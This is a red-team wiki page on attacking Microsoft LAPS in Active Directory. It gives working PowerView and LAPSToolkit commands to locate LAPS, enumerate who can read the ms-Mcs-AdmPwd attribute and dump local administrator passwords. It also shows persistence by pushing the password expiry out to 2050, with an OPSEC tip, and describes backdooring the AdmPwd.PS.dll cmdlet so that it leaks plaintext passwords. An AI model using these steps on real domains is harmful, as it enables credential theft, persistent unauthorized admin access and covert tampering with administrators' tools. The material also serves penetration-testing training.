---
title: Local Administrator Password Solution (LAPS)
category: Red Team
order: 13
---

LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account.  It ensures that the password for each account is different, random, and automatically changed on a defined schedule.  Permission to request and reset the credentials can be delegated, which are also auditable.  Here is a quick summary of how LAPS works:

* The Active Directory schema is extended and adds two new properties to computer objects, called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.
* By default, the DACL on `ms-Mcs-AdmPwd` only grants Domain Admins but each computer is given permission to update these properties on itself.
* Rights to read `AdmPwd` can be delegated to other principals (users, groups, etc) which is typically done at the OU level.
* A new GPO template is installed, which is used to deploy the LAPS configuration to machines.
* The LAPS client is also installed on every machine.
* When a machine performs a gpudate, it will check the `AdmPwdExpirationTime` property on its own computer. If the time has elapsed, it will generate a new password and sets it on the `ms-Mcs-AdmPwd` property.

# Hunting LAPS

* `AdmPwd.dll` on disk.

There are few methods to check for the presence of LAPS. If it's applied to a machine `AdmPwd.dll` will be on disk.

```
beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 179kb    fil     05/05/2021 07:04:14   AdmPwd.dll
```

* Via GPO.

We can search for GPO that have "LAPS" or some other descriptive term in the name

```powershell
Get-DomainGPO | ?{$_.DisplayName -like "*laps*"} | select DisplayName, Name, GPCFileSyspath |fl
```

* `ms-Mcs-AdmPwdExpirationTime` property not null on a computer.

When LAPS is installed on a computer the property `ms-Mcs-AdmPwdExpirationTime` will have a value set, every domain user can read this property.

```
Get-DomainComputer | ?{$_."ms-Mcs-AdmPwdExpirationTime" -ne $null} | select dnsHostName
```

# Downloading LAPS Configuration

If we locate the correct GPO, we can download the LAPS configuration form the `gpcfilesyspath`.

```
\\corp.local\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
```

We can parse the pol file with `Parse-PolFile` from the `GPRegistryPolicyParser` package.

* [https://github.com/PowerShell/GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

```powershell
Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 30

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : LapsAdmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PwdExpirationProtectionEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 0
```

# Reading ms-Mcs-AdmPwd

## PowerView

We can discover which principals are allowed to read the `ms-Mcs-AdmPwd` attribute by reading its DACL on each computer object.

* PowerView (dev):
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

ObjectDN                                                      SecurityIdentifier                          
--------                                                      ------------------                          
CN=WKSTN-2,OU=Workstations,DC=corp,DC=local                   S-1-5-21-569305411-121244042-2357301523-1107
```

We can check the Name of the principal from a SID.

```powershell
ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
CORP\Support Engineers
```
## LAPSToolkit

`LAPSToolkit` is a dedicated PowerShell tooling that can help us.

* [https://github.com/leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

First such as PowerView we need to import the module.

```powershell
Import-Module .\LAPSToolit.ps1
```

`Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access

```powershell
Find-LAPSDelegatedGroups
```

`Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights". This will reveal any users that can read the attribute without havind had it specifically delegated to them.

## Get LDAP Password

Finally we just need to read the attribute.

* PowerView (dev):
```powershell
Get-DomainComputer -Identity WKSTN-1 -Properties ms-Mcs-AdmPwd
```

# Password Expiration Protection

If the `PwdExpirationProtectionEnabled` policy is enabled, prevents a user of computer setting the expiration date of a password beyond the password age specified in the `PasswordAgeDays`.

It means that if password expiration is enabled and we attempted to modify its expiration date beyond the value set, it would trigger an automatic reset of that password.

But if its not configured in the GPO, then password expiration protection is disabled by default.

> **Note**: The expiration date is an 18-digit timestamp calculated as the number of 100-nanoseconds interavals. We can use a epoch converter [https://www.epochconverter.com/ldap](https://www.epochconverter.com/ldap) to translate these timestamps to human-readable format.


## Persistence by pushing the expiry out

First we need to convert the wanted data to epoch. In that case I will use `141940046450000000` which is translated to `16 October 2050 11:04:05`.

With a elevated shell we just need to modify the attribute.

```powershell
Set-DomainObject -Identity WKSTN-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '141940046450000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '141940046450000000' for object 'WKSTN-1$'
```

> **OPSEC Alert**: The expiration date will still be visible to amdins and a manual reset will change the password and restore the expiration date.

# Backdoor in LAPS

Since Powershell heavily utilises the .NET framework, the dlls are written in C# which makes them fairly trivial to download, modify and re-upload.

We can modify the source code of the PowerShell cmdlet `Get-AdmPwdPassword` to install a backdoor.

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 13:04:13   en-US
 24kb     fil     05/05/2021 12:04:14   AdmPwd.PS.dll
 5kb      fil     04/28/2021 18:56:38   AdmPwd.PS.format.ps1xml
 4kb      fil     04/28/2021 18:56:38   AdmPwd.PS.psd1
 26kb     fil     05/05/2021 12:04:14   AdmPwd.Utils.dll
```

We can download `AdmPwd.PS.dll` open it with `dnSpy` and modify the class `GetPassword`.

Here we can inject our backdoor, we can simply send the plaintext password via internet, print on a file etc...